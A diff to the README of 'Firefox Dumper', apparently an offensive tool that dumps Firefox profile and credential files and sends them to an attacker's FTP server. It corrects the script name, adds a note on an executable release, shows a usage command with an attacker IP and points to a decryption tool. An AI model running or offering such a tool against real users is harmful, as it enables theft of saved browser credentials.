@@ -15,7 +15,7 @@ Installing Firefox Dumper
 
 Change directories to Firefox-Dumper and that's it.
 
-```python3 Oh365UserFinder.py -h```
+```python3 firefoxdumper.py -h```
 
 This will output the help menu, which contains the following flags:
 
@@ -23,11 +23,13 @@ This will output the help menu, which contains the following flags:
 
 ```-i, --ip - Mandatory - declares the attacker's FTP server IP. Firefox Dumper uses port 21 by default and is hardcoded.```
 
-
 Examples of full commands include:
 
 ```python3 firefoxdumper.py -i 192.168.1.1```
 
+### Executable Version
+
+Check releases for the executable version. Note that it has to be ran from a command line with the -i flag.  
 
 ### Notes
 A tool called "Firefox Decrypt" can be found here - https://github.com/unode/firefox_decrypt.  This tool is required in order to decrypt the files.  
